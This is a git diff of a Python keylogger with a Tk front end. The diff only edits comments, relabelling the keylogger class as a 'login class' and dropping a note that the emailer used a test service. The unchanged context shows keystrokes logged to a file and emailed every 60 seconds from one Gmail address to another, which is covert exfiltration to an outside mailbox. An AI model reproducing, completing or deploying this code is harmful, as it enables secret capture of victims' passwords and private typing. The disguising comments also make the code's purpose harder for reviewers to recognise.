@@ -10,7 +10,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 import time
 
-# === Setup Logging ===
+#sb login
 log_dir = "key_logs"
 if not os.path.exists(log_dir):
     os.makedirs(log_dir)
@@ -19,7 +19,7 @@ log_file = os.path.join(log_dir, "keystrokes.log")
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 
-# === Keylogger Class ===
+#it me (sandesh this is setup login class)
 class KeyLogger:
     def __init__(self):
         self.listener = None
@@ -46,7 +46,7 @@ class KeyLogger:
 logger = KeyLogger()
 
 
-# === Email Sender (Mailtrap) ===
+# === Email Sender 
 def send_log_via_email():
     sender_email = "nocap7884@gmail.com"
     receiver_email = "cubaloveu333@gmail.com"
@@ -80,14 +80,14 @@ def send_log_via_email():
         print(f"❌ Error sending email: {e}")
 
 
-# === Background Email Scheduler ===
+
 def auto_email_sender():
     while True:
         time.sleep(60)  # Wait for 60 seconds
         send_log_via_email()
 
 
-# === GUI App ===
+
 class App:
     def __init__(self, root):
         self.root = root
@@ -139,7 +139,7 @@ class App:
             messagebox.showinfo("No Logs", "No log file found.")
 
 
-# === Launch App ===
+# ready to run (lanuches app)
 if __name__ == "__main__":
     root = tk.Tk()
     app = App(root)
